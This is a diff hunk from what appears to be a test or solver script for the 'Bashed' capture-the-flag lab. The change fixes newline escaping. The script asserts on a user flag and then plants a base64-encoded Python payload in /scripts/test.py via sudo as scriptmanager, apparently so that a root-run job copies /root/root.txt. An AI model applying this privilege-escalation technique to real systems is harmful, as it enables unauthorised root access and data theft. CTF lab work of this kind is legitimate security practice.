@@ -29,9 +29,9 @@ user_flag = cmd("cat /home/arrexel/user.txt")
 assert "TTP{bashed_ci_private_user" in user_flag, "User flag missing"
 
 payload = (
-    "import os\\n"
-    "with open('/tmp/bashed-root-proof','w') as f: f.write(os.popen('id').read())\\n"
-    "with open('/root/root.txt') as src, open('/tmp/bashed-root-flag-proof','w') as dst: dst.write(src.read())\\n"
+    "import os\n"
+    "with open('/tmp/bashed-root-proof','w') as f: f.write(os.popen('id').read())\n"
+    "with open('/root/root.txt') as src, open('/tmp/bashed-root-flag-proof','w') as dst: dst.write(src.read())\n"
 )
 encoded = base64.b64encode(payload.encode()).decode()
 write = cmd("echo " + encoded + " | base64 -d | sudo -u scriptmanager tee /scripts/test.py >/dev/null")
